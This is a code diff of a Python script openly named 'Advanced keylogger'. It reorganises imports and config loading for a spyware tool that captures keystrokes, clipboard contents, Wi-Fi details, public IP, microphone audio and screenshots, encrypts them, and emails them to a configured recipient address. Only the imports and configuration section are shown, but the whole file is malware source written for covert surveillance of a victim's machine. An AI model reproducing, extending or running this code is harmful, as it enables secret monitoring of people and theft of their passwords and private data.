@@ -1,27 +1,37 @@
-# keylogger.py
+# Advanced keylogger
 
 # Libraries
+#email
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
+#computer info
 import socket
 import platform
+from requests import get
+#clipboard
 import win32clipboard
+#wifi info
 import subprocess
 import re
+#keylogging
 from pynput.keyboard import Listener
 import time
 import os
 import shutil
+#multithreading
 import threading
 import concurrent.futures
+#audio
 from scipy.io.wavfile import write
 import sounddevice as sd
+#encryption
 from cryptography.fernet import Fernet
-from requests import get
+#screenshot
 from PIL import ImageGrab
+#importing variables
 import json
 
 with open('config.json') as f:
@@ -44,14 +54,14 @@ wifi_information_e = config["wifi_information_e"]
 microphone_time = config["microphone_time"]
 time_iteration = config["time_iteration"]
 
-email_address = config["email_address"] # Enter disposable email here
-password = config["password"] # Enter email password here
+email_address = config["from_email"] 
+password = config["password"] 
 
-toaddr = config["toaddr"] # Enter the email address you want to send your information to
+toaddr = config["to_email"] 
 
-key = config["key"] # Generate an encryption key from the Cryptography folder
+key = config["key"] 
 
-file_path = config["file_path"] # Enter the file path you want your files to be saved to
+file_path = config["file_path"] 
 
 if not os.path.exists(file_path):
     os.makedirs(file_path)
